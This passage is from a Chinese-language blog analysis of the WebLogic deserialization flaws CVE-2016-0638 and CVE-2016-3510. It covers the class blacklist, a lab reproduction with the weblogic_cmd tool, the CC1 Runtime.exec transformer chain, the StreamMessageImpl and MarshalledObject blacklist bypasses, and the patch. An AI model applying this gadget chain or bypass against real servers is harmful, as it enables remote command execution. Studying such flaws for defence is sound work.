<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// 检查是否禁用了黑名单</span></span><br><span class="line">    <span class="keyword">if</span> (!isBlackListDisabled()) &#123;</span><br><span class="line">        <span class="comment">// 检查是否禁用了默认的黑名单条目</span></span><br><span class="line">        <span class="keyword">if</span> (!isDefaultBlacklistEntriesDisabled()) &#123;</span><br><span class="line">            updateBlackList(<span class="string">&quot;+org.apache.commons.collections.functors,+com.sun.org.apache.xalan.internal.xsltc.trax,+javassist,+org.codehaus.groovy.runtime.ConvertedClosure,+org.codehaus.groovy.runtime.ConversionHandler,+org.codehaus.groovy.runtime.MethodClosure&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取系统属性weblogic.rmi.blacklist的值。如果该属性存在且不为空，则调用updateBlackList()方法来添加该属性中定义的黑名单条目</span></span><br><span class="line">        updateBlackList(System.getProperty(<span class="string">&quot;weblogic.rmi.blacklist&quot;</span>, (String)<span class="literal">null</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个if判断应该与某个环境变量的设置有关，具体实现不再关注<br>在CVE-2015-4852的攻击过程中，会使用CC1链，里面用到了<code>org .apache.commons.collections.functors.ChainedTransformer</code>，这个类的包名在黑名单中，因此这里会返回true，从而导致在resolveClass中抛出异常<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230802234659.png"></p>
<p>ClassFilter.isBlackListed方法同样作用于MsgAbbrevInputStream的resolveClass方法，对其传入的类名进行了同样的黑名单过滤。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass descriptor)</span> <span class="keyword">throws</span> InvalidClassException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 通过synchronized关键字锁定了lastCTE对象，以保证线程安全</span></span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.lastCTE) &#123;</span><br><span class="line">        <span class="comment">// 获取类名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> descriptor.getName();</span><br><span class="line">        <span class="comment">// 如果className不为空，并且其长度大于0，并且该类名在ClassFilter.isBlackListed()方法中被列入黑名单，则抛出InvalidClassException异常</span></span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() &gt; <span class="number">0</span> &amp;&amp; ClassFilter.isBlackListed(className)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, descriptor.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取当前线程的类加载器ClassLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> RJVMEnvironment.getEnvironment().getContextClassLoader();</span><br><span class="line">        <span class="comment">// 如果lastCTE对象中的clz为null，或者lastCTE对象中的ccl不等于当前线程的类加载器ccl，则重新加载类</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.lastCTE.clz == <span class="literal">null</span> || <span class="built_in">this</span>.lastCTE.ccl != ccl) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="built_in">this</span>.lastCTE.descriptor.getName();</span><br><span class="line">            <span class="comment">// 如果是PreDiablo的对等体，则调用JMXInteropHelper.getJMXInteropClassName()方法获取Interop的类名</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isPreDiabloPeer()) &#123;</span><br><span class="line">                classname = JMXInteropHelper.getJMXInteropClassName(classname);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 从PRIMITIVE_MAP（一个Map集合）中获取classname对应的Class对象</span></span><br><span class="line">            <span class="built_in">this</span>.lastCTE.clz = (Class)PRIMITIVE_MAP.get(classname);</span><br><span class="line">            <span class="comment">// 如果获取失败，则调用Utilities.loadClass()方法，加载classname对应的Class对象</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.lastCTE.clz == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.lastCTE.clz = Utilities.loadClass(classname, <span class="built_in">this</span>.lastCTE.annotation, <span class="built_in">this</span>.getCodebase(), ccl);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.lastCTE.ccl = ccl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.lastClass = <span class="built_in">this</span>.lastCTE.clz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.lastClass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：MsgAbbrevInputStream用于反序列化RMI请求，将请求参数和返回结果转换为Java对象。InboundMsgAbbrev用于处理入站RMI请求，检查和验证请求的合法性，并保证请求的安全性和可靠性<br>补丁作用位置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</span><br><span class="line">weblogic.rjvm.MsgAbbrevInputStream.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">weblogic</span>.iiop.Utils.class</span><br></pre></td></tr></table></figure>

<p>既然在ServerChannelInputStream与MsgAbbrevInputStream中都存在黑名单过滤，则</p>
<p><strong>漏洞复现</strong>：<br>使用工具<a href="https://github.com/5up3rc/weblogic_cmd.git">weblogic_cmd</a>来绕过补丁进行攻击<br>使用IDEA打开，使用JDK1.6，配置运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-H <span class="string">&quot;10.140.32.159&quot;</span> -C <span class="string">&quot;touch /tmp/cve-2016-0638&quot;</span> -B -os linux</span><br></pre></td></tr></table></figure>

<p>如果端口不是7001，可以使用-P参数，也可以在源码中直接修改<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803113049.png"><br>运行程序，如果出现<code>sun.tools.asm</code>包未找到，手动添加jdk6中的tools.jar包<br>在docker中查询是否命令执行成功<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803122010.png"><br>创建文件成功，成功绕过补丁<br><strong>漏洞分析</strong>：<br>这里分两步进行漏洞的分析，第一：此工具如何生成payload；第二：生成的payload如何绕过防护成功执行<br>第一：如何生成payload<br>观察main函数中的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">executeBlind(host, port);</span><br></pre></td></tr></table></figure>

<p>进入此函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">executeBlind</span><span class="params">(String host, String port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;B&quot;</span>) &amp;&amp; cmdLine.hasOption(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行命令:&quot;</span> + cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>));</span><br><span class="line">        WebLogicOperation.blindExecute(host, port, cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;执行blind命令完成&quot;</span>);</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的输出步骤正是执行一次控制台输出的信息，因此关键信息在WebLogicOperation.blindExecute中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">blindExecute</span><span class="params">(String host, String port, String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;;</span><br><span class="line">    <span class="comment">// 根据操作系统选择执行命令的程序</span></span><br><span class="line">    <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;os&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Main.cmdLine.getOptionValue(<span class="string">&quot;os&quot;</span>).equalsIgnoreCase(<span class="string">&quot;linux&quot;</span>)) &#123;</span><br><span class="line">            cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 关键步骤</span></span><br><span class="line">    <span class="comment">// 将需要执行的命令传入该函数，生成payload</span></span><br><span class="line">    <span class="type">byte</span>[] payload = SerialDataGenerator.serialBlindDatas(cmds);</span><br><span class="line">    <span class="comment">// 将payload发送至目标weblogic</span></span><br><span class="line">    T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成payload的关键又在于SerialDataGenerator.serialBlindDatas方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialBlindDatas(String[] execArgs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> serialData(blindExecutePayloadTransformerChain(execArgs));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的命令执行参数被两层方法包裹，里面那层有关是与CC链有关，外面那层根据方法名应该是将payload的序列化后返回<br>先看blindExecutePayloadTransformerChain方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Transformer[] blindExecutePayloadTransformerChain(String[] execArgs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                    String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                    <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                    Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                    <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;execArgs&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="keyword">new</span> <span class="title class_">HashSet</span>())&#125;;</span><br><span class="line">    <span class="keyword">return</span> transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>果然这是一条TransformerChain，再看serialData函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialData(Transformer[] transformers) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">// 初始化map 设置laymap</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) Reflections</span><br><span class="line">            .getFirstCtor(</span><br><span class="line">                    <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">            .newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Map.class</span><br><span class="line">            .cast(Proxy.newProxyInstance(SerialDataGenerator.class.getClassLoader(),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler));</span><br><span class="line"></span><br><span class="line">    handler = (InvocationHandler) Reflections.getFirstCtor(</span><br><span class="line">            <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">            .newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">_handler</span> <span class="operator">=</span> BypassPayloadSelector.selectBypass(handler);</span><br><span class="line">    <span class="keyword">return</span> Serializables.serialize(_handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这些过程很明显是CC1链的构造过程，与众不同的是倒数第二句代码BypassPayloadSelector.selectBypass，进入该函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">selectBypass</span><span class="params">(Object payload)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;marshall&quot;</span>)) &#123;</span><br><span class="line">        payload = marshalledObject(payload);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;streamMessageImpl&quot;</span>)) &#123;</span><br><span class="line">        payload = streamMessageImpl(Serializables.serialize(payload));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> payload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要根据TYPE选择对应的处理方法，先看TYPE&#x3D;streamMessageImpl的处理方法，他先将我们前面构造好的payload进行序列化，然后使用streamMessageImpl函数进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">streamMessageImpl</span><span class="params">(<span class="type">byte</span>[] object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>();</span><br><span class="line">    streamMessage.setDataBuffer(object, object.length);</span><br><span class="line">    <span class="keyword">return</span> streamMessage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里创建了一个StreamMessageImpl对象，并通过setDataBuffer方法将序列化后的数据存入该对象的buffer属性，然后返回StreamMessageImpl对象<br>调用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setDataBuffer:<span class="number">906</span>, StreamMessageImpl (weblogic.jms.common)</span><br><span class="line">streamMessageImpl:<span class="number">29</span>, BypassPayloadSelector (com.supeream.weblogic)</span><br><span class="line">selectBypass:<span class="number">38</span>, BypassPayloadSelector (com.supeream.weblogic)</span><br><span class="line">serialData:<span class="number">45</span>, SerialDataGenerator (com.supeream.serial)</span><br><span class="line">serialBlindDatas:<span class="number">95</span>, SerialDataGenerator (com.supeream.serial)</span><br><span class="line">blindExecute:<span class="number">43</span>, WebLogicOperation (com.supeream.weblogic)</span><br><span class="line">executeBlind:<span class="number">62</span>, Main (com.supeream)</span><br><span class="line">main:<span class="number">198</span>, Main (com.supeream)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803161521.png"><br>然后再回到serialData函数中，执行最后一条语句，返回对StreamMessageImpl对象序列化后的数据<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803161846.png"><br>最后返回blindExecute方法，执行最后一句，将payload按照T3协议发送至目标<br>如果在BypassPayloadSelector.selectBypass函数中，TYPE是marshall，会进入marshalledObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">marshalledObject</span><span class="params">(Object payload)</span> &#123;</span><br><span class="line">    <span class="type">MarshalledObject</span> <span class="variable">marshalledObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        marshalledObject = <span class="keyword">new</span> <span class="title class_">MarshalledObject</span>(payload);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> marshalledObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处将payload封装进了marshalledObject对象，MarshalledObject是Java标准库中的一个类，用于将Java对象序列化为字节数组，并能够在网络上传输或存储在磁盘上，后面步骤和上面一致，对该对象进行序列化</p>
<p>第二：生成的payload如何成功利用<br>在ServerChannelInputStream.resolveClass下断点，使用weblogic_cmd工具向目标发送payload<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803164045.png"><br>此时的className正是序列化的第一层，指向weblogic.jms.common.StreamMessageImpl，此类名不在黑名单中，故可以绕过isBlackListed方法</p>
<p>之所以采用StreamMessageImpl，是<strong>因为当StreamMessageImpl类的readExternal执行时，会反序列化传入的参数并调用该参数反序列化后对应类的这个readObject方法</strong><br>在StreamMessageImpl类中的readExternal下断点<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">readExternal:<span class="number">1396</span>, StreamMessageImpl (weblogic.jms.common)</span><br><span class="line">readExternalData:<span class="number">1835</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1794</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">69</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">41</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>该函数如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="built_in">super</span>.readExternal(var1);</span><br><span class="line">    <span class="type">byte</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readByte();</span><br><span class="line">    <span class="type">byte</span> <span class="variable">var3</span> <span class="operator">=</span> (<span class="type">byte</span>)(var2 &amp; <span class="number">127</span>);</span><br><span class="line">    <span class="keyword">if</span> (var3 &gt;= <span class="number">1</span> &amp;&amp; var3 &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">// 如果消息类型为1，则表示该消息是一个普通的消息。该方法将从ObjectInput中读取PayloadStream对象，并将其用ObjectInputStream进行反序列化，最后将反序列化后的Java对象通过writeObject方法写入消息中</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="comment">// 从ObjectInput对象中读取PayloadStream对象，并将其作为InputStream对象传递给createPayload方法</span></span><br><span class="line">                <span class="built_in">this</span>.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);</span><br><span class="line">                <span class="comment">// 将从PayloadStream对象中获取一个BufferInputStream对象，并将其作为参数传递给ObjectInputStream类的构造函数</span></span><br><span class="line">                <span class="type">BufferInputStream</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.payload.getInputStream();</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(var4);</span><br><span class="line">                <span class="built_in">this</span>.setBodyWritable(<span class="literal">true</span>);</span><br><span class="line">                <span class="built_in">this</span>.setPropertiesWritable(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.writeObject(var5.readObject());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (EOFException var9) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="built_in">this</span>.reset();</span><br><span class="line">                        <span class="built_in">this</span>.setPropertiesWritable(<span class="literal">false</span>);</span><br><span class="line">                        <span class="type">PayloadStream</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.payload.copyPayloadWithoutSharedStream();</span><br><span class="line">                        <span class="built_in">this</span>.payload = var7;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (JMSException var8) &#123;</span><br><span class="line">                        JMSClientExceptionLogger.logStackTrace(var8);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (MessageNotWriteableException var10) &#123;</span><br><span class="line">                    JMSClientExceptionLogger.logStackTrace(var10);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (javax.jms.MessageFormatException var11) &#123;</span><br><span class="line">                    JMSClientExceptionLogger.logStackTrace(var11);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (JMSException var12) &#123;</span><br><span class="line">                    JMSClientExceptionLogger.logStackTrace(var12);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//如果消息类型为3，则表示该消息是一个压缩消息。如果消息的高位字节不为0，则表示消息是经过压缩的，该方法将调用readExternalCompressedMessageBody方法读取压缩后的消息内容</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">if</span> ((var2 &amp; -<span class="number">128</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.readExternalCompressedMessageBody(var1);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">// 如果消息类型为2，则表示该消息是一个流消息。该方法将从ObjectInput中读取PayloadStream对象，并将其作为消息的PayloadStream对象进行设置</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">this</span>.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> JMSUtilities.versionIOException(var3, <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中var4是正常反序列化后的数据<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803173055.png"><br>其buf的值和第一次payload反序列化后是一样的<br>然后将var4实例化成一个ObjectInputStream对象，即var5，在try中，var5调用了readObject方法，即实现了真实payload的反序列化<br><strong>总结</strong>：<br>绕过原理：先将恶意的反序列化对象封装在StreamMessageImpl对象中，然后再对StreamMessageImpl对象进行反序列化，将生成的payload发送至目标服务器。<br>目标服务器拿到payload字节码后，读取到类名StreamMessageImpl，此类名不在黑名单中，故可以绕过resolveClass中的过滤。在调用StreamMessageImpl的readObject时，底层会调用其readExternal方法，对封装的序列化数据进行反序列化，从而调用恶意类的readObject函数<br><strong>修复</strong>：<br>2016年4月p22505423_1036_Generic发布的补丁<br>在weblogic.jms.common.StreamMessageImpl的readExternal方法创建的ObjectInputStream换成了自定义的FilteringObjectInputStream，并在其中对类进行了过滤，使用网上的一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230812220539.png"></p>
<p><strong>参考</strong>：<br><a href="https://www.cnblogs.com/nice0e3/p/14207435.html">Java安全之Weblogic 2016-0638分析 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/8529">CVE-2016-3510:Weblogic反序列化分析</a><br><a href="https://xz.aliyun.com/t/10173">weblogic漏洞分析之CVE-2016-0638</a></p>
<h3 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h3><p><strong>漏洞分析</strong>：<br>此漏洞的利用方式与CVE-2016-0638一致，只不过这里不再借助StreamMessageImpl类，而是借助MarshalledObject类<br>继续分析weblogic_cmd代码，结合下面代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">selectBypass</span><span class="params">(Object payload)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;marshall&quot;</span>)) &#123;</span><br><span class="line">        payload = marshalledObject(payload);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;streamMessageImpl&quot;</span>)) &#123;</span><br><span class="line">        payload = streamMessageImpl(Serializables.serialize(payload));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> payload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面提到，TYPE为streamMessageImpl时，会选择StreamMessageImpl作为绕过黑名单的类，而TYPE为marshall时，则选择MarshalledObject作为绕过黑名单的类<br>进入marshalledObject方法，此时传递的参数是恶意的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">marshalledObject</span><span class="params">(Object payload)</span> &#123;</span><br><span class="line">    <span class="type">MarshalledObject</span> <span class="variable">marshalledObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        marshalledObject = <span class="keyword">new</span> <span class="title class_">MarshalledObject</span>(payload);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> marshalledObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里将第一层payload作为参数实例化一个MarshalledObject对象并返回，观察MarshalledObject类的构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">MarshalledObject</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.hash = <span class="number">13</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个ByteArrayOutputStream对象var2</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="comment">// 并将其作为参数传递给MarshalledObjectOutputStream类的构造函数，创建一个MarshalledObjectOutputStream对象var3</span></span><br><span class="line">        <span 